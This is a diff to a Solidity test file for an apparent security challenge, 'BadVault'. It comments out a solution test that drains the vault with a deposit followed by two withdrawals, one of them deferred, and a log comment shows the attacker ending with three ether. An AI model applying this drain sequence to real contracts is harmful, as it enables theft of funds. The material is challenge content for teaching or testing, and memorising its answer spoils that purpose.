@@ -185,30 +185,30 @@ contract BadVaultTest is Test {
     //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
     //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
     //   attacker final balance 3000000000000000000
-    function test_BadVault_solution() public {
-        prove_BadVault_usingExploitLaunchPad(
-            // 1st call
-            address(vault),
-            1 ether,
-            abi.encodeWithSelector(
-                vault.deposit.selector
-            ),
+    // function test_BadVault_solution() public {
+    //     prove_BadVault_usingExploitLaunchPad(
+    //         // 1st call
+    //         address(vault),
+    //         1 ether,
+    //         abi.encodeWithSelector(
+    //             vault.deposit.selector
+    //         ),
 
-            // 2nd call
-            address(vault),
-            0 ether,
-            abi.encodeWithSelector(
-                vault.withdraw.selector,
-                1 ether
-            ),
+    //         // 2nd call
+    //         address(vault),
+    //         0 ether,
+    //         abi.encodeWithSelector(
+    //             vault.withdraw.selector,
+    //             1 ether
+    //         ),
 
-            // deferred call
-            address(vault),
-            0 ether,
-            abi.encodeWithSelector(
-                vault.withdraw.selector,
-                1 ether
-            )
-        );
-    }
+    //         // deferred call
+    //         address(vault),
+    //         0 ether,
+    //         abi.encodeWithSelector(
+    //             vault.withdraw.selector,
+    //             1 ether
+    //         )
+    //     );
+    // }
 }
